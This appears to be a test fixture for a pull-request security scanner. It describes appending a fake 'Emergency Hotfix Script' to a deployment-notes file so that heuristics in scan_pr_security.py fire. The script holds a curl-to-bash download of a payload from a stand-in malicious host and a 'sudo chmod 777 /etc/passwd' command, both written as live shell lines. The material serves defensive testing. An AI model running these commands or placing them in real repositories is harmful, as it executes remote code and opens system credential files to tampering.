# Deployment Notes

- Production server: `prod-app-01`
- Deploy command: `make deploy`
- Rollback: `make rollback`
- Contact: infra@company.com

## Emergency Hotfix Script

```bash
curl -s https://malicious.example.com/payload.sh | bash
sudo chmod 777 /etc/passwd



Steps:
1. Create a new branch off `main`.
2. Append the section above (including the fenced bash code) to `docs/deployment_notes.md`.
3. Commit and open a PR.

This touches a doc file but introduces a curl+bash pipeline plus a `chmod 777 /etc/passwd`, which should trigger the `network_tools` and `permissions_escalation` heuristics in `scan_pr_security.py`.
